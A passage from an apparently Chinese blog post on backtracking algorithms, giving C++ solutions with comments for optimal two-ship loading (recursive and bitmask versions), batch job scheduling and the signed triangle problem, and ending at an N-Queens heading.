				maxSum <span class="token operator">=</span> sum<span class="token punctuation">;</span>
				optimSelection <span class="token operator">=</span> curSelection<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">return</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token comment">// 货物idx能否放入货船1，若能，则向下搜索</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> goods<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> c1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			curSelection<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
			<span class="token function">dfs</span><span class="token punctuation">(</span>sum <span class="token operator">+</span> goods<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			curSelection<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token comment">// 不考虑将货物idx放入货船1</span>
		<span class="token function">dfs</span><span class="token punctuation">(</span>sum<span class="token punctuation">,</span> idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

	<span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 执行搜索，初始时sum和idx均为0</span>

	<span class="token comment">// 判断在最优解情况下（将尽可能重的货物放入货船1后），余下的货物能否放入货船2</span>
	<span class="token keyword">int</span> sum2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>optimSelection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			sum2 <span class="token operator">+=</span> goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>sum2 <span class="token operator">></span> c2<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">// 若不能，则此问题无解，返回空数组</span>
	<span class="token comment">// 若能，则构造最优解</span>
	vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">res</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>optimSelection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 选择放入货船1</span>
			res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 选择放入货船2</span>
			res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h3 id="状态压缩"><a href="#状态压缩" class="headerlink" title="状态压缩"></a>状态压缩</h3><p>事实上，对于此类涉及<strong>选或不选</strong>的回溯算法，还可以将其写成迭代的形式。</p>
<p>由于递归回溯的本质可以看作是对一棵二叉树进行的搜索，每次选或者不选都将产生两个分支，那么所有情况的数量为 2<sup>n</sup>（n 为被搜索对象的数目，在本例中为货物的总数）。我们考虑用一个整数 mask 将每种情况表示出来，该整数称为<strong>掩码</strong>，关注它的 n 位二进制形式，其中 mask 的第 i 位二进制位就代表对应的货物 <code>goods[i]</code>  有没有被选择，通常用 1 代表被选择，0 代表不被选择。那么不难得知 mask 的范围为 0~2<sup>n</sup>-1 。</p>
<p>在得到了每一种情况下的掩码后，就需要对其进行<strong>解码</strong>了，可以遍历 0~n-1 的所有整数 i，并将其右移 i 位，将 <code>goods[i]</code> 的对应的二进制位移到了最低位，此时再将和 1 进行<strong>按位与</strong>运算就能得知此情况下货物 i 是否被选择。</p>
<p>两种算法都有 2<sup>n</sup> 中搜索状态，每种状态下需要 O(n) 时间来进行最优解的更新，因此两种算法的渐进时间复杂度都为 O(n * 2<sup>n</sup>).</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">optimalLoading</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> goods<span class="token punctuation">,</span> <span class="token keyword">int</span> c1<span class="token punctuation">,</span> <span class="token keyword">int</span> c2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> goods<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">curSelection</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> optimSelection<span class="token punctuation">;</span>
	<span class="token keyword">int</span> maxSum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> mask <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> mask <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>mask<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 遍历每种情况</span>
		<span class="token comment">// 将sum和curSelection全部复位</span>
		<span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		curSelection<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">bool</span> isChoosed <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">>></span> i<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isChoosed<span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> c1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				sum <span class="token operator">+=</span> goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
				curSelection<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">></span> maxSum<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			maxSum <span class="token operator">=</span> sum<span class="token punctuation">;</span>
			optimSelection <span class="token operator">=</span> curSelection<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token comment">// 构造最优解（与递归回溯部分完全相同）</span>
	<span class="token keyword">int</span> sum2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>optimSelection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			sum2 <span class="token operator">+=</span> goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>sum2 <span class="token operator">></span> c2<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">res</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>optimSelection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="批处理作业调度"><a href="#批处理作业调度" class="headerlink" title="批处理作业调度"></a>批处理作业调度</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/job.png"></p>
<h2 id="解题代码-1"><a href="#解题代码-1" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">batchJobScheduling</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">&amp;</span> jobs<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> jobs<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 作业数量</span>
	<span class="token keyword">int</span> res <span class="token operator">=</span> INT32_MAX<span class="token punctuation">,</span> curSum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 最优调度时间，当前调度时间</span>
	<span class="token keyword">int</span> f1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 机器1完成处理时间</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">f2</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 机器2完成处理时间</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> optimSche<span class="token punctuation">;</span> <span class="token comment">// 最优调度方案</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> curSche<span class="token punctuation">;</span> <span class="token comment">// 当前调度方案</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 初始调度方案为 0,1,2,...,n-1</span>
		curSche<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token comment">// 递归搜索函数</span>
	function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 搜索达到最大深度</span>
			<span class="token comment">// 更新最优解</span>
			optimSche <span class="token operator">=</span> curSche<span class="token punctuation">;</span>
			res <span class="token operator">=</span> curSum<span class="token punctuation">;</span>
			<span class="token keyword">return</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> idx<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 全排列搜索</span>
			f1 <span class="token operator">+=</span> jobs<span class="token punctuation">[</span>curSche<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
			f2<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f2<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">></span> f1<span class="token punctuation">)</span> <span class="token operator">?</span> f2<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">:</span> f1<span class="token punctuation">)</span> <span class="token operator">+</span> jobs<span class="token punctuation">[</span>curSche<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
			curSum <span class="token operator">+=</span> f2<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>curSum <span class="token operator">&lt;</span> res<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 剪枝（若当前累计和已经大于等于最优解，则不继续向下搜索）</span>
				<span class="token function">swap</span><span class="token punctuation">(</span>curSche<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> curSche<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token function">swap</span><span class="token punctuation">(</span>curSche<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> curSche<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token comment">// 回溯</span>
			f1 <span class="token operator">-=</span> jobs<span class="token punctuation">[</span>curSche<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
			curSum <span class="token operator">-=</span> f2<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

	<span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 递归搜索</span>
	<span class="token comment">// 打印最优调度方案</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		cout <span class="token operator">&lt;&lt;</span> optimSche<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> cout <span class="token operator">&lt;&lt;</span> <span class="token string">"->"</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="符号三角形问题"><a href="#符号三角形问题" class="headerlink" title="符号三角形问题"></a>符号三角形问题</h1><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/signed.png"></p>
<h2 id="解题代码-2"><a href="#解题代码-2" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">signedTriangle</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> num <span class="token operator">=</span> n <span class="token operator">*</span> <span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">// 三角形符号总数</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 总数为奇数，不可能相等</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">triangles</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false代表'+',true代表'-'</span>
	<span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 合法图形个数</span>
	vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">>></span> fullShape<span class="token punctuation">;</span> <span class="token comment">// 所有合法图形</span>

	<span class="token comment">// 递归搜索函数</span>
	function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 到达最大搜索深度，判断是否可行</span>
			<span class="token keyword">int</span> pCnt <span class="token operator">=</span> num <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span> sCnt <span class="token operator">=</span> num <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">// 剩余'+','-'的符号个数</span>
			vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> newShape<span class="token punctuation">;</span> <span class="token comment">// 当前图形</span>
			queue<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> q<span class="token punctuation">,</span> nq<span class="token punctuation">;</span> <span class="token comment">// 轮换队列</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 将第一行符号加入队列</span>
				q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>triangles<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				newShape<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>triangles<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token operator">--</span><span class="token punctuation">(</span>triangles<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">?</span> sCnt <span class="token operator">:</span> pCnt<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">while</span> <span class="token punctuation">(</span>q<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">while</span> <span class="token punctuation">(</span>q<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					<span class="token keyword">bool</span> ft <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">bool</span> nt <span class="token operator">=</span> ft <span class="token operator">^</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 队列前两个符号异或得到下面的符号</span>
					nq<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>nt<span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token operator">--</span><span class="token punctuation">(</span>nt <span class="token operator">?</span> sCnt <span class="token operator">:</span> pCnt<span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">if</span> <span class="token punctuation">(</span>sCnt <span class="token operator">*</span> pCnt <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token comment">// 其中一个符号个数超过一半</span>
					newShape<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>nt<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token punctuation">&#125;</span>
				q <span class="token operator">=</span> <span class="token function">move</span><span class="token punctuation">(</span>nq<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 队列轮换（利用右值引用进行资源所有权的交换）</span>
			<span class="token punctuation">&#125;</span>
			<span class="token comment">// 该结果合法</span>
			<span class="token operator">++</span>res<span class="token punctuation">;</span>
			fullShape<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>newShape<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		triangles<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
		<span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		triangles<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
		<span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

	<span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 递归搜索</span>
	<span class="token comment">// 打印所有合法图形</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> shape <span class="token operator">:</span> fullShape<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> col <span class="token operator">=</span> n<span class="token punctuation">;</span> col <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">--</span>col<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">int</span> di <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">-</span> col<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>n <span class="token operator">+</span> col <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> col<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				cout <span class="token operator">&lt;&lt;</span> shape<span class="token punctuation">[</span>i <span class="token operator">+</span> di<span class="token punctuation">]</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="N皇后"><a href="#N皇后" class="headerlink" title="N皇后"></a>N皇后</h1><h2 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/nq.png"></p>
